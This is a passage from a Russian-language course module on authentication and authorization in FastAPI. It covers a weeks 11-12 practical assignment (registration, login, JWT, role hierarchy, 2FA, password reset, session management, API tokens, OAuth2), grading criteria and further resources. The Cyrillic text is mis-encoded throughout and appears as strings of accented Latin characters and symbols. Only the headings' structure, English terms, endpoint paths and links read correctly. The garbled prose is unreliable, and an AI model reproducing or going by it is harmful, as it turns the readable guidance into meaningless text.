- **–ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ** - –∫—ç—à–∏—Ä—É–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤ (Redis)
- **–ò–Ω–¥–µ–∫—Å—ã –ë–î** - —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—Å–µ –∑–∞–ø—Ä–æ—Å—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∏–Ω–¥–µ–∫—Å—ã
- **Connection pooling** - –Ω–∞—Å—Ç—Ä–æ–π—Ç–µ –ø—É–ª —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –¥–ª—è –ë–î

### **3. –†–æ—Ç–∞—Ü–∏—è –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ**

- **–†–æ—Ç–∞—Ü–∏—è —Ç–æ–∫–µ–Ω–æ–≤** - –ø–ª–∞–Ω–∏—Ä—É–π—Ç–µ —Ä–æ—Ç–∞—Ü–∏—é SECRET_KEY (–æ—Å–æ–±–µ–Ω–Ω–æ –ø—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏)
- **–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π** - —Ä–µ–≥—É–ª—è—Ä–Ω–æ –æ–±–Ω–æ–≤–ª—è–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
- **–ê—É–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏** - —Ä–µ–≥—É–ª—è—Ä–Ω–æ –ø—Ä–æ–≤–µ—Ä—è–π—Ç–µ –ª–æ–≥–∏ –Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å

### **4. –†–µ–∑–µ—Ä–≤–Ω–æ–µ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ**

- –†–µ–≥—É–ª—è—Ä–Ω–æ –¥–µ–ª–∞–π—Ç–µ –±—ç–∫–∞–ø—ã –ë–î
- –•—Ä–∞–Ω–∏—Ç–µ SECRET_KEY –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ–º –º–µ—Å—Ç–µ (–Ω–µ –≤ git!)
- –ò–º–µ–π—Ç–µ –ø–ª–∞–Ω –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –ø—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏

---

## **üèÜ –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–¥–∞–Ω–∏–µ –Ω–∞ –Ω–µ–¥–µ–ª–∏ 11-12**

### **–ß–∞—Å—Ç—å 1: –ë–∞–∑–æ–≤–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è**

#### **–®–∞–≥ 1.1: –ù–∞—Å—Ç—Ä–æ–π–∫–∞ (30 –º–∏–Ω)**
- [ ] –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤—Å–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ (–≤–∫–ª—é—á–∞—è pyotp, qrcode)
- [ ] –°–æ–∑–¥–∞—Ç—å –º–æ–¥–µ–ª–∏ User, UserSession, APIToken
- [ ] –ù–∞—Å—Ç—Ä–æ–∏—Ç—å security.py —Å —Ñ—É–Ω–∫—Ü–∏—è–º–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –∏ JWT
- [ ] –°–æ–∑–¥–∞—Ç—å –º–∏–≥—Ä–∞—Ü–∏–∏ Alembic –¥–ª—è —Ç–∞–±–ª–∏—Ü

#### **–®–∞–≥ 1.2: –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è (1 —á–∞—Å)**
- [ ] –°–æ–∑–¥–∞—Ç—å Pydantic –º–æ–¥–µ–ª–∏ –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/register`
- [ ] –î–æ–±–∞–≤–∏—Ç—å –≤–∞–ª–∏–¥–∞—Ü–∏—é email –∏ –ø–∞—Ä–æ–ª—è
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é (unit + integration —Ç–µ—Å—Ç—ã)

#### **–®–∞–≥ 1.3: –í—Ö–æ–¥ (1 —á–∞—Å)**
- [ ] –°–æ–∑–¥–∞—Ç—å Pydantic –º–æ–¥–µ–ª–∏ –¥–ª—è –≤—Ö–æ–¥–∞
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/login`
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å –≥–µ–Ω–µ—Ä–∞—Ü–∏—é JWT —Ç–æ–∫–µ–Ω–æ–≤ (access + refresh)
- [ ] –î–æ–±–∞–≤–∏—Ç—å –∑–∞—â–∏—Ç—É –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ (rate limiting)
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Ö–æ–¥

#### **–®–∞–≥ 1.4: –ó–∞—â–∏—â–µ–Ω–Ω—ã–µ endpoints (1 —á–∞—Å)**
- [ ] –°–æ–∑–¥–∞—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å `get_current_user`
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/me`
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/password/change`
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/logout`
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞—â–∏—â–µ–Ω–Ω—ã–µ endpoints

### **–ß–∞—Å—Ç—å 2: –†–æ–ª–µ–≤–∞—è –º–æ–¥–µ–ª—å –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è**

#### **–®–∞–≥ 2.1: –ò–µ—Ä–∞—Ä—Ö–∏—è —Ä–æ–ª–µ–π (30 –º–∏–Ω)**
- [ ] –°–æ–∑–¥–∞—Ç—å Enum –¥–ª—è —Ä–æ–ª–µ–π (READER, LIBRARIAN, ADMIN, SUPER_ADMIN)
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø–æ–ª–µ role –≤ –º–æ–¥–µ–ª—å User
- [ ] –°–æ–∑–¥–∞—Ç—å –º–∏–≥—Ä–∞—Ü–∏—é –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Ä–æ–ª–µ–π

#### **–®–∞–≥ 2.2: –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–æ–ª–µ–π (1 —á–∞—Å)**
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å `require_role(role)` –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å `require_roles([roles])` –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å
- [ ] –°–æ–∑–¥–∞—Ç—å —É–¥–æ–±–Ω—ã–µ –∞–ª–∏–∞—Å—ã (require_admin, require_librarian)
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏

#### **–®–∞–≥ 2.3: –ó–∞—â–∏—Ç–∞ endpoints (1 —á–∞—Å)**
- [ ] –ó–∞—â–∏—Ç–∏—Ç—å endpoints —Å–æ–∑–¥–∞–Ω–∏—è/—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∫–Ω–∏–≥ (—Ç–æ–ª—å–∫–æ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞—Ä—å+)
- [ ] –ó–∞—â–∏—Ç–∏—Ç—å endpoints —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ (—Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω)
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É –ø—Ä–∞–≤ –Ω–∞ —É—Ä–æ–≤–Ω–µ –±–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–∏ –≤ —Å–µ—Ä–≤–∏—Å–∞—Ö
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –¥–æ—Å—Ç—É–ø–∞

### **–ß–∞—Å—Ç—å 3: –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å**

#### **–®–∞–≥ 3.1: –î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è (2 —á–∞—Å–∞)**
- [ ] –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å pyotp –∏ qrcode
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/2fa/setup` (–≥–µ–Ω–µ—Ä–∞—Ü–∏—è QR –∫–æ–¥–∞)
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/2fa/verify` (–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏)
- [ ] –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å `/auth/login` –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏ 2FA
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/login/2fa/verify`
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∫—É —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–¥–æ–≤
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –≤–µ—Å—å flow 2FA

#### **–®–∞–≥ 3.2: –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –ø–∞—Ä–æ–ª–µ–π (1.5 —á–∞—Å–∞)**
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/password/reset/request`
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/password/reset/confirm`
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –ø–∞—Ä–æ–ª—è –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞—Ö
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/password/change`
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É, —á—Ç–æ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è –æ—Ç —Å—Ç–∞—Ä–æ–≥–æ
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ —Ä–∞–±–æ—Ç—ã —Å –ø–∞—Ä–æ–ª—è–º–∏

#### **–®–∞–≥ 3.3: –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏—è–º–∏ (1 —á–∞—Å)**
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å —Å–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–π –ø—Ä–∏ –≤—Ö–æ–¥–µ
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/sessions` (–ø—Ä–æ—Å–º–æ—Ç—Ä –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π)
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/logout/all` (–≤—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤)
- [ ] –î–æ–±–∞–≤–∏—Ç—å –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ (–º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –Ω–µ—É–¥–∞—á–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏)
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏—è–º–∏

### **–ß–∞—Å—Ç—å 4: API —Ç–æ–∫–µ–Ω—ã –∏ OAuth2**

#### **–®–∞–≥ 4.1: API —Ç–æ–∫–µ–Ω—ã (1.5 —á–∞—Å–∞)**
- [ ] –°–æ–∑–¥–∞—Ç—å –º–æ–¥–µ–ª—å APIToken
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/tokens` (POST - —Å–æ–∑–¥–∞–Ω–∏–µ)
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/tokens` (GET - —Å–ø–∏—Å–æ–∫ —Ç–æ–∫–µ–Ω–æ–≤)
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å endpoint `/auth/tokens/{token_id}` (DELETE - –æ—Ç–∑—ã–≤)
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∫—É scopes
- [ ] –î–æ–±–∞–≤–∏—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (expires_at)
- [ ] –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å `get_current_user` –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏ API —Ç–æ–∫–µ–Ω–æ–≤
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–±–æ—Ç—É —Å API —Ç–æ–∫–µ–Ω–∞–º–∏

#### **–®–∞–≥ 4.2: OAuth2 (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, 2 —á–∞—Å–∞)**
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å Password flow –¥–ª—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤
- [ ] –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å Client credentials flow –¥–ª—è machine-to-machine
- [ ] –î–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∫—É refresh token rotation
- [ ] –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å OAuth2 flows

## **üìä –ö—Ä–∏—Ç–µ—Ä–∏–∏ –æ—Ü–µ–Ω–∫–∏**

### **–ë–∞–∑–æ–≤—ã–µ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (40 –±–∞–ª–ª–æ–≤):**
1. **–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∏ –≤—Ö–æ–¥** (15 –±–∞–ª–ª–æ–≤):
   - –ö–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —Ä–∞–±–æ—Ç–∞ JWT —Ç–æ–∫–µ–Ω–æ–≤
   - –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö
   - –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π

2. **–†–æ–ª–µ–≤–∞—è –º–æ–¥–µ–ª—å** (15 –±–∞–ª–ª–æ–≤):
   - –ü—Ä–∞–≤–∏–ª—å–Ω–∞—è –∏–µ—Ä–∞—Ä—Ö–∏—è —Ä–æ–ª–µ–π
   - –ó–∞—â–∏—Ç–∞ endpoints
   - –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –≤ –±–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–µ

3. **–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å** (10 –±–∞–ª–ª–æ–≤):
   - –ó–∞—â–∏—Ç–∞ –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞
   - –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
   - –ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏

### **–ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–µ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (30 –±–∞–ª–ª–æ–≤):**
1. **–†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è** (15 –±–∞–ª–ª–æ–≤):
   - –î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
   - –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏—è–º–∏
   - –°–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è

2. **API –¥–æ—Å—Ç—É–ø** (10 –±–∞–ª–ª–æ–≤):
   - API —Ç–æ–∫–µ–Ω—ã —Å scopes
   - –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è
   - –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –≤—Ä–µ–º–µ–Ω–∏

3. **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥** (5 –±–∞–ª–ª–æ–≤):
   - –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
   - –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
   - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –≤—Ö–æ–¥–∞

### **–≠–∫—Å–ø–µ—Ä—Ç–Ω—ã–µ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (20 –±–∞–ª–ª–æ–≤):**
1. **–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å** (10 –±–∞–ª–ª–æ–≤):
   - –ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Ç–æ–∫–µ–Ω–æ–≤
   - –û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è –∑–∞–ø—Ä–æ—Å–æ–≤
   - –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞

2. **–ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è** (10 –±–∞–ª–ª–æ–≤):
   - OAuth2 –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã
   - SSO (Single Sign-On)
   - –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞

## **üéØ –ò—Ç–æ–≥ –Ω–µ–¥–µ–ª—å 11-12**

–ö –∫–æ–Ω—Ü—É —ç—Ç–∏—Ö –Ω–µ–¥–µ–ª—å –≤—ã —Å–æ–∑–¥–∞–¥–∏—Ç–µ **–ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏**, –∫–æ—Ç–æ—Ä–∞—è:

1. **–û–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å** –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
2. **–ü—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≥–∏–±–∫—É—é —Å–∏—Å—Ç–µ–º—É –ø—Ä–∞–≤** —á–µ—Ä–µ–∑ —Ä–æ–ª–∏ –∏ scopes
3. **–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç—ã** (JWT, OAuth2)
4. **–í–∫–ª—é—á–∞–µ—Ç —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏** (2FA, —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏—è–º–∏)
5. **–õ–µ–≥–∫–æ –∏–Ω—Ç–µ–≥—Ä–∏—Ä—É–µ—Ç—Å—è** —Å —Ä–∞–∑–ª–∏—á–Ω—ã–º–∏ –∫–ª–∏–µ–Ω—Ç–∞–º–∏

**–ö–ª—é—á–µ–≤—ã–µ –Ω–∞–≤—ã–∫–∏:**
- –†–∞–±–æ—Ç–∞ —Å JWT —Ç–æ–∫–µ–Ω–∞–º–∏
- –†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Ä–æ–ª–µ–≤–æ–π –º–æ–¥–µ–ª–∏
- –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
- –°–æ–∑–¥–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö API —Ç–æ–∫–µ–Ω–æ–≤
- –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–µ—Å—Å–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- –ó–∞—â–∏—Ç–∞ –æ—Ç –∞—Ç–∞–∫ –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é

–ü—Ä–∞–≤–∏–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ ‚Äî —ç—Ç–æ —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ª—é–±–æ–≥–æ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è. –û–Ω–∞ –∑–∞—â–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∏ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º GDPR –∏ –¥—Ä—É–≥–∏–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.

---

## **üìö –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã**

### **–û—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è:**
- [FastAPI Security](https://fastapi.tiangolo.com/tutorial/security/) - –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è FastAPI –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
- [python-jose](https://python-jose.readthedocs.io/) - –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å JWT
- [passlib](https://passlib.readthedocs.io/) - –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ –¥–ª—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π
- [OAuth 2.0 RFC](https://oauth.net/2/) - —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è OAuth 2.0

### **–ß—Ç–æ –¥–∞–ª—å—à–µ?**
–ü–æ—Å–ª–µ –æ—Å–≤–æ–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –º–æ–∂–Ω–æ –∏–∑—É—á–∏—Ç—å:
- **OAuth2 –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã** - –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Google, GitHub, Facebook
- **SSO (Single Sign-On)** - –µ–¥–∏–Ω—ã–π –≤—Ö–æ–¥ –¥–ª—è –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
- **WebAuthn/FIDO2** - –±–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –±–µ–∑ –ø–∞—Ä–æ–ª–µ–π
- **SAML** - –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
- **–ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è** - JWT –≤ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö